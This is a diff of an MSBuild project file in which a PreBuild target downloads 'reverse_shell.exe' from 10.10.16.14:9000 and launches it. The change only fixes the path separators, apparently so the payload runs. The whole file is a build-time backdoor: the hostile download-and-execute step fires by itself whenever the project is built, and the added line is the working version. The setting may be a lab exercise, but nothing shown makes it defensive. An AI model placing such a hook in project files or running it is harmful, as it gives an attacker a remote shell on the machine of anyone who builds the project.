@@ -7,7 +7,7 @@
   </PropertyGroup>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="curl &quot;http://10.10.16.14:9000/reverse_shell.exe&quot; -o &quot;C:\\Users\\Public\\Documents\\reverse_shell.exe&quot; &amp;&amp; start C:\\Users\\Public\\Documents\\reverse_shell.exe" />
+    <Exec Command="curl &quot;http://10.10.16.14:9000/reverse_shell.exe&quot; -o &quot;C:/Users/Public/Documents/reverse_shell.exe&quot; &amp;&amp; start C:/Users/Public/Documents/reverse_shell.exe" />
   </Target>
 
 </Project>
